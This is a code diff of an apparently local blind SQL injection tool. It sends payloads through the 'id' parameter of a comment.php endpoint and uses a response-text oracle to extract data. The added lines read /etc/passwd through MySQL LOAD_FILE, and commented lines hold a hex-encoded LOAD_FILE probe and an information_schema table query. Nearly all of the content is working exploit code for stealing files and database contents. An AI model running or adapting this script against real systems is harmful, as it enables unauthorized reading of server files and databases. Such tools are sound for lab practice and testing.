@@ -19,30 +19,19 @@ def test(payload):
 class MyTester(Tester):
 
     def __init__(self):
-        super(MyTester, self).__init__(lambda r : 'admin' in r.text)
+        super(MyTester, self).__init__(lambda r : 'admin' in r.text, True)
     
     def get_request(self, payload):
-        return requests.get('http://127.0.0.1:8181/comment.php', params={'id':'1 {}'.format(payload)}, verify=False)
+        return requests.get('http://127.0.0.1:8181/comment.php', params={'id':'1 {}'.format(payload), 'log' : '1'}, verify=False)
 
-sf = StringFinder(MyTester())
+tester = MyTester()
 
-print(sf.read_string("(SELECT {})".format(encode_str('coucou'))))
+sf = StringFinder(tester)
 
-def read_file(filename):
-	return read_string("LOAD_FILE({})".format(encode_str('/etc/passwd')))
+# print(sf.read_string("(SELECT {})".format(encode_str('coucou'))))
+print(sf.read_file('/etc/passwd'))
 
-def read_file__(file):
-	index = 1
-	str = ''
-	while True:
-		for c in range(20,127):
-			if(test(file_char_at_index(file,c, index))):
-				str += chr(c)
-				print(str)
-				break
-		print(str)
-		break			
-		index = index + 1
+# print(tester.test("AND LENGTH(LOAD_FILE(0x2f6574632f706173737764))>0"))
 
 
 # print(read_string("(SELECT table_name FROM information_schema.tables ORDER BY table_name LIMIT 1 OFFSET 6)"))
